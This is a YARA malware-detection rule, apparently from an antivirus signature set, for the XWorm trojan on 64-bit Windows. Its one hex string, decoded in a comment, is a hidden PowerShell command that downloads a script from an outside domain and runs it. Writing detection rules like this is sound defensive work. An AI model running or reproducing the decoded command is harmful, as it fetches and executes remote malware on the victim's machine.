
rule Trojan_Win64_XWorm_A_AMTB{
	meta:
		description = "Trojan:Win64/XWorm.A!AMTB,SIGNATURE_TYPE_PEHSTR_EXT,02 00 02 00 01 00 00 "
		
	strings :
		$a_80_0 = {2d 4e 6f 50 72 6f 66 69 6c 65 20 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 48 69 64 64 65 6e 20 2d 63 20 22 28 4e 65 77 2d 4f 62 6a 65 63 74 20 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 29 2e 44 6f 77 6e 6c 6f 61 64 53 74 72 69 6e 67 28 27 68 74 74 70 3a 2f 2f 61 74 75 61 6c 69 7a 61 64 6f 61 74 69 76 61 64 6f 2e 63 6f 6d 2f 30 2f 30 2e 70 73 31 27 29 20 7c 20 69 65 78 22 } //-NoProfile -WindowStyle Hidden -c "(New-Object Net.WebClient).DownloadString('http://atualizadoativado.com/0/0.ps1') | iex"  2
	condition:
		((#a_80_0  & 1)*2) >=2
 
}